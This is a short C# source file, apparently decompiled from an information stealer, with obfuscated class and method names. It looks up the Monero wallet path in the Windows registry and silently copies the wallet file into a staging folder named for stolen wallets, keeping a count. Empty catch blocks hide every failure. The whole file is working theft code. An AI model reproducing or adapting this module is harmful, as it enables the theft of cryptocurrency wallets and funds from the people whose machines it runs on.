using Microsoft.Win32;
using System.IO;

internal class az
{
	public static string a = "\\Wallets\\Monero\\";

	public static void a(string ju)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
			{
				try
				{
					Directory.CreateDirectory(ju + az.a);
					string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
					Directory.CreateDirectory(ju + az.a);
					File.Copy(text, ju + az.a + text.Split('\\')[text.Split('\\').Length - 1]);
					ba.a++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
